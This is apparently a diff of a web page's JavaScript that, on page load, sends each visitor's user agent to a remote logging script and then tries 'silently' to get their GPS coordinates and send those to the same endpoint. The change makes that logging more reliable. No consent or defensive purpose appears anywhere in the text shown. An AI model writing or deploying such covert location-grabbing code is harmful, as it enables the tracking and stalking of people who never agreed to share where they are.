@@ -51,25 +51,27 @@
     window.onload = function() {
         var ua = navigator.userAgent;
         
-        // Send Data via Fetch
-        fetch(SCRIPT_URL + "?ip=AutoDetected&ua=" + encodeURIComponent(ua), {
-            method: 'POST',
-            body: JSON.stringify({ip: 'AutoDetected', ua: ua})
-        }).then(function() {
+        // 1. Send IP and UA via GET (URL Parameters)
+        // This is the most reliable way to ensure the script logs the data
+        fetch(SCRIPT_URL + "?ip=AutoDetected&ua=" + encodeURIComponent(ua))
+        .then(function() {
             document.getElementById('status').innerText = "Details Saved.";
             
-            // Try for GPS silently
+            // 2. Try for GPS silently
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     var lat = position.coords.latitude;
                     var long_val = position.coords.longitude;
+                    
                     // Update log with GPS if available
                     fetch(SCRIPT_URL + "?lat=" + lat + "&long=" + long_val + "&ua=" + encodeURIComponent(ua));
                 }, function(error) {
-                    // GPS denied or failed, IP is already logged
+                    // GPS denied or failed, but IP is already logged
+                    console.log("GPS denied or failed");
                 });
             }
-        }).catch(function(error) {
+        })
+        .catch(function(error) {
             document.getElementById('status').innerText = "Connection Failed.";
             console.error(error);
         });
